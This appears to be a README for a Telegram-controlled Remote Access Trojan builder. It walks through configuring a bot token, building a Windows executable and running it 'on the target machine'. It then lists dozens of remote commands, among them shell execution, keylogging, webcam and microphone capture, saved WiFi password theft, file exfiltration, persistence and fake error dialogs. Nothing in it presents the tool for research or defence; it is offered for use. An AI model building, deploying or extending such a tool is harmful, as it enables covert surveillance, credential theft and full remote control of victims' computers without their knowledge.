
🚀 Quick Start
Step 1 — Install Python

Download and install Python 3.8+ from python.org

    ⚠️ IMPORTANT: During installation, check ✅ "Add Python to PATH"

Step 2 — Clone the Repository

 git colne https://github.com/ademy6220-arch/RAT-builder.git


Step 3 — Install Dependencies

pip install -r requirements.txt

Step 4 — Create a Telegram Bot

    Open Telegram → search @BotFather → send /newbot
    Follow the prompts, give your bot a name and username
    Copy the Bot Token (e.g., 8551779985:AAFxIsKFSSviwldBGhk-oeqRlYSrmIV-xxx)

Step 5 — Get Your User ID

    Search @userinfobot on Telegram → send /start
    Note your numeric User ID (e.g., 8310686102)

Step 6 — Run the Builder

python builder.py


    Click the 🔨 Builder tab
    Paste your Bot Token and User ID
    Customize the executable name, icon, and admin mode
    Click ⚡ BUILD EXECUTABLE
    Wait 1-2 minutes — the client .exe appears in the output/ folder

Step 7 — Deploy & Connect

    Run the built .exe on the target machine
    You'll receive an automatic notification on Telegram
    Send /help to see all 60+ available commands

🔨 Build Your Own Builder (Optional)
📋 Commands
🖥️ System
Command 	Description
/shell <cmd> 	Execute shell command
/admincheck 	Check admin privileges
/sysinfo 	Full system info (CPU, RAM, GPU, disk, uptime)
/whoami 	Current user details
/datetime 	Date and time
/shutdown 	Shutdown PC
/restart 	Restart PC
/logoff 	Log off user
/lock 	Lock workstation
/sleep 	Sleep mode
/listprocess 	List running processes
/prockill <name> 	Kill a process
/idletime 	User idle time
/installed 	List installed programs
/services 	List Windows services
/startup 	Add to Windows startup (4 methods)
/rmstartup 	Remove all persistence
/devices 	List all connected devices
📁 File Management
Command 	Description
/cd <path> 	Change directory
/dir 	List current directory
/currentdir 	Show working directory
/download <file> 	Download file from PC
/upload 	Upload file to PC (attach file)
/uploadlink <url> <name> 	Download URL to PC
/delete <path> 	Delete file or folder
/copy <src> <dst> 	Copy file
/move <src> <dst> 	Move file
/rename <old> <new> 	Rename file
/mkdir <path> 	Create folder
/openfile <path> 	Open file on PC
/drives 	List all drives
/search <name> 	Search for files
🎭 Interaction
Command 	Description
/message <text> 	Show message box
/fakeerror <text> 	Show fake error dialog
/voice <text> 	Text-to-speech
/write <text> 	Type on keyboard
/wallpaper 	Set wallpaper (attach image)
/website <url> 	Open URL in browser
/audio 	Play audio file (attach)
/popup <n> <text> 	Spam popup messages
/volumeup 	Volume +10%
/volumedown 	Volume −10%
/mute 	Toggle mute
/monitors_off 	Turn screens off
📷 Capture & Surveillance
Command 	Description
/screenshot 	Take screenshot
/clipboard 	Get clipboard text
/setclipboard <text> 	Set clipboard text
/getcams 	List available cameras
/selectcam <n> 	Select camera index
/webcampic 	Take webcam picture
/geolocate 	Geolocate by IP
/record <sec> 	Record microphone
/keylog 	Start keylogger
/stopkeylog 	Stop keylogger & get log
🌐 Network
Command 	Description
/wifilist 	Scan nearby WiFi networks
/wifipasswords 	Show saved WiFi passwords
/ipconfig 	Network adapter info
/netstat 	Active connections
/env 	Environment variables
🔒 System Control
Command 	Description
/blocksite <site> 	Block website (hosts file)
/unblocksite <site> 	Unblock website
/hidetaskbar 	Hide taskbar
/showtaskbar 	Show taskbar
/hidedesktop 	Hide desktop icons
/showdesktop 	Show desktop icons
/swap_mouse 	Swap mouse buttons
/unswap_mouse 	Reset mouse buttons
⚙️ General
Command 	Description
/start 	Connect & show device info
/help 	Show all commands
/exit 	Exit client
